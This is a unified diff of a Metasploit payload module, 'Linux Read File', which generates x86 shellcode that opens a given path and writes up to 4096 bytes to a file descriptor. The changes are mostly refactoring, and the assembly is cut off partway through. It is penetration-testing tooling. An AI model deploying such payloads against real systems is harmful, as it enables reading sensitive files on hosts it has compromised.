@@ -1,45 +1,47 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 module MetasploitModule
-
   CachedSize = 63
 
   include Msf::Payload::Single
-  include Msf::Payload::Linux
+  include Msf::Payload::Linux::X86::Prepends
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Linux Read File',
-      'Version'       => '',
-      'Description'   => 'Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor',
-      'Author'        => 'hal',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_X86))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Linux Read File',
+        'Version' => '',
+        'Description' => 'Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor',
+        'Author' => 'hal',
+        'License' => MSF_LICENSE,
+        'Platform' => 'linux',
+        'Arch' => ARCH_X86
+      )
+    )
 
     # Register exec options
     register_options(
       [
-        OptString.new('PATH',   [ true,  "The file path to read" ]),
-        OptString.new('FD',     [ true,  "The file descriptor to write output to", 1 ]),
-      ], self.class)
+        OptString.new('PATH', [ true, 'The file path to read' ]),
+        OptString.new('FD', [ true, 'The file descriptor to write output to', 1 ]),
+      ]
+    )
   end
 
-  def generate_stage(opts={})
+  def generate(_opts = {})
     fd = datastore['FD']
 
-    payload_data =<<-EOS
+    payload_data = <<-EOS
       jmp file
 
       open:
         mov eax,0x5       ; open() syscall
         pop ebx           ; Holds the filename
-        xor ecx,ecx       ; Open for reading (0) 
+        xor ecx,ecx       ; Open for reading (0)
         int 0x80
 
       read:
